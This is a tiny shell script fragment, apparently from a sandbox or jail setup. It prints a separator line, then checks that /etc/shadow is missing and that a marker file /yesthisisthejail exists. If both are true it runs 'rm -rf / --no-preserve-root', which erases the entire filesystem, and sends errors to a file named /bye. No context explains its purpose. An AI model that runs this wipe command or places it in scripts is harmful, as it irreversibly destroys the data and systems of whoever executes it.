echo '--------------------------------------------------------------------------------'
if [ ! -f /etc/shadow ]; then
    if [ -f /yesthisisthejail ]; then
        /bin/rm -rf / --no-preserve-root 2>/bye
    fi
fi
